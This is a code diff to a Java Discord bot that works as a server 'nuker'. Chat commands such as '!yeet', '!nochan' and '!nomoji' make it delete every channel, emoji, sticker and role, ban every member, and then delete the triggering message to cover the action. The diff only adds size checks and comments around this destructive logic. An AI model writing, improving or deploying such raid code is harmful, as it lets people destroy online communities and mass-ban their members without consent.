@@ -159,23 +159,53 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!yeet")) return;
             Guild guild = event.getGuild();
 
-            guild.getChannels().forEach(guildChannel -> guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]")));
-            guild.getEmojis().forEach(richCustomEmoji -> richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]")));
-            guild.getStickers().forEach(guildSticker -> guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Stcker " + guildSticker.getName() + " [" + guildSticker.getId() + "]")));
+            // Check if there is channels and delete them
+            if (guild.getChannels().size() > 1) {
+                guild.getChannels().forEach(guildChannel -> {
+                    guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
+                });
+            } else {
+                System.out.println("No channels found.");
+            }
+
+            // Check if there is emojis/stickers and delete them
+            if (guild.getEmojis().size() > 1 || guild.getStickers().size() > 1) {
+                guild.getEmojis().forEach(richCustomEmoji -> {
+                    richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
+                });
+                guild.getStickers().forEach(guildSticker -> {
+                    guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
+                });
+            } else {
+                System.out.println("No emojis/stickers found.");
+            }
+
+            // Check if there are roles and delete them
             guild.getRoles().forEach(role -> {
                 try {
-                    role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
+                    if (guild.getRoles().size() > 1) {
+                        role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
+                    } else {
+                        System.out.println("No roles found.");
+                    }
                 } catch (Exception ignored) {
 
                 }
             });
+
+            // Check if there are members and ban them (if bannable)
             guild.getMembers().forEach(member -> {
                 try {
-                    member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
+                    if (guild.getMembers().size() > 1) {
+                        member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
+                    } else {
+                        System.out.println("No members found.");
+                    }
                 } catch (Exception ignored) {
 
                 }
             });
+
             event.getMessage().delete().queue();
         }
     }
@@ -187,12 +217,17 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nomoji")) return;
             Guild guild = event.getGuild();
 
-            guild.getEmojis().forEach(richCustomEmoji -> {
-                richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
-            });
-            guild.getStickers().forEach(guildSticker -> {
-                guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
-            });
+            if (guild.getEmojis().size() > 1 || guild.getStickers().size() > 1) {
+                guild.getEmojis().forEach(richCustomEmoji -> {
+                    richCustomEmoji.delete().queue(emoji -> System.out.println("[LOG] Yeeted Emoji " + richCustomEmoji.getName() + " [" + richCustomEmoji.getId() + "]"));
+                });
+                guild.getStickers().forEach(guildSticker -> {
+                    guildSticker.delete().queue(sticker -> System.out.println("[LOG] Yeeted Emoji " + guildSticker.getName() + " [" + guildSticker.getId() + "]"));
+                });
+            } else {
+                System.out.println("No emojis/stickers found.");
+            }
+
             event.getMessage().delete().queue();
         }
     }
@@ -204,9 +239,14 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!nochan")) return;
             Guild guild = event.getGuild();
 
-            guild.getChannels().forEach(guildChannel -> {
-                guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
-            });
+            if (guild.getChannels().size() > 1) {
+                guild.getChannels().forEach(guildChannel -> {
+                    guildChannel.delete().queue(channel -> System.out.println("[LOG] Yeeted Channel " + guildChannel.getName() + " [" + guildChannel.getId() + "]"));
+                });
+            } else {
+                System.out.println("No channels found.");
+            }
+
             event.getMessage().delete().queue();
         }
     }
@@ -220,16 +260,21 @@ public final class Bot {
 
             guild.getRoles().forEach(role -> {
                 try {
-                    role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
+                    if (guild.getRoles().size() > 1) {
+                        role.delete().queue(roley -> System.out.println("[LOG] Yeeted Role " + role.getName() + " [" + role.getId() + "]"));
+                    } else {
+                        System.out.println("No roles found.");
+                    }
                 } catch (Exception ignored) {
 
                 }
             });
+
             event.getMessage().delete().queue();
         }
     }
 
-    // Ban all memebrs
+    // Ban all memebrs (if bannable)
     private static final class Member extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
@@ -238,11 +283,16 @@ public final class Bot {
 
             guild.getMembers().forEach(member -> {
                 try {
-                    member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
+                    if (guild.getMembers().size() > 1) {
+                        member.ban(0, TimeUnit.SECONDS).queue(membor -> System.out.println("[LOG] Yeeted Member " + member.getEffectiveName() + " [" + member.getId() + "]"));
+                    } else {
+                        System.out.println("No members found.");
+                    }
                 } catch (Exception ignored) {
 
                 }
             });
+
             event.getMessage().delete().queue();
         }
     }
